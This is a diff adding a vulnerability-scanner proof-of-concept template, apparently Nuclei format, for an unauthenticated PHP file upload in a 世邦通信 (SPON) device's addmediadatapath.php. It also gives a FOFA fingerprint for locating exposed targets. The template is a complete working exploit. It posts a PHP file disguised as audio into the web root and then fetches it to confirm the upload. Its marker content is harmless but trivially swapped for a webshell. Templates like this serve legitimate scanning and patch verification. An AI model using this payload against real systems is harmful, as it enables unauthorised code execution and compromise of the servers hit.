@@ -1,0 +1,70 @@
+id: poc-qnnagnfdva11prfe
+info:
+  name: 世邦通信addmediadatapath.php文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qnnagnfdva11prfe'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qnnagnfdva11prfe
+    fofa: icon_hash="-1830859634"
+http:
+- raw:
+  - 'POST /php/addmediadatapath.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYrqVrkjRl2AHEKXG
+
+    Content-Length: 395
+
+    Connection: keep-alive
+
+
+    ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
+
+    Content-Disposition: form-data; name="subpath"
+
+
+
+    ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
+
+    Content-Disposition: form-data; name="fullpath"
+
+
+    C:\ICPAS\Wnmp\WWW\php
+
+    ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
+
+    Content-Disposition: form-data; name="file"; filename="test.php"
+
+    Content-Type: audio/mp3
+
+
+    123456
+
+    ------WebKitFormBoundaryYrqVrkjRl2AHEKXG--
+
+
+    上传定位：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /php/test.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
